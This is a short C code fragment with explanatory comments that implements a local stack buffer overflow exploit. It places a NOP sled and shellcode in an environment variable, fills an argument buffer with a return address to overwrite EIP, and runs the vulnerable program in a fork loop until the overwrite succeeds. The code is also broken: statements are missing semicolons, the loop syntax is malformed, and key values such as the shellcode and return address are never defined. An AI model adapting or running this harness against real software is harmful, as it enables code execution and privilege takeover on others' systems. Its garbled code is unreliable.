
//lets get the name of the vulnerable application and the number of bytes needed to overwrite EIP
appname = strdup(argv[1]);
payload_size = atoi(argv[2])
buff = (char *) malloc(payload_size);   

//Our payload will be first filled with a lot of ox90(NOP)
memset(env_var, 0x90, ENV_LEN);
env_var[ENV_LEN-1] = 0;
//Then, we copy at the end of it our shellcode
memcpy(env_var+ENV_LEN-strlen(shellcode)-1, shellcode, strlen(shellcode));
//We are going to fill the stack area with our return address. sooner or later, the process execution will be led right there
// and EIP will be successfully overwritten
p = (int *) buff;
for(i=0; i<payload_size; i+= sizeof(int); p++)
    *p = RET;
*p = 0

// While our process hasnt correctly quit
do  {
    switch(pid=fork()){
        case 0:
            // Execute the vulnerable program using our crafted enviornmental variable
            execle(appname, appname, buff, NULL, env);
            exit(1);
            break;
        default:
            // wait for child process to terminate and get its return adress
            waitpid(pid, &ret, 0);
            break;
    }
} while(ret);